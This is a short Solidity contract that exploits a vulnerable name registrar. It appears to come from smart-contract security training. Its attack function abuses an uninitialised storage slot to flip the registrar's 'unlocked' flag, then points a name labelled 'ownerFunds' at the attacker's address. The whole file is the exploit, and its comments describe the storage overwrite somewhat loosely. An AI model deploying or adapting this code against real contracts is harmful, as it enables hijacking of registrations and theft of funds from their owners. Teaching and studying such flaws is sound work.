pragma solidity ^0.4.15;

interface IVulnerableRegistrar {
    function register(bytes32 _name, address _mappedAddress) external;
    function resolve(bytes32 _name) external view returns (address);
}

contract ExploitNameRegistrar {
    IVulnerableRegistrar public target;
    bytes32 public constant MALICIOUS_NAME = keccak256("hacked");

    constructor(address _target) public {
        target = IVulnerableRegistrar(_target);
    }

    function attack() public {
        // This call will overwrite storage slot 0 (unlocked), setting it to true.
        target.register(MALICIOUS_NAME, address(this));

        // Once unlocked is set to true via the vulnerability, we can now make legit-looking registrations.
        target.register(keccak256("ownerFunds"), msg.sender);  // redirect another name to our attacker
    }

    function checkResolution(bytes32 _name) public view returns (address) {
        return target.resolve(_name);
    }
}

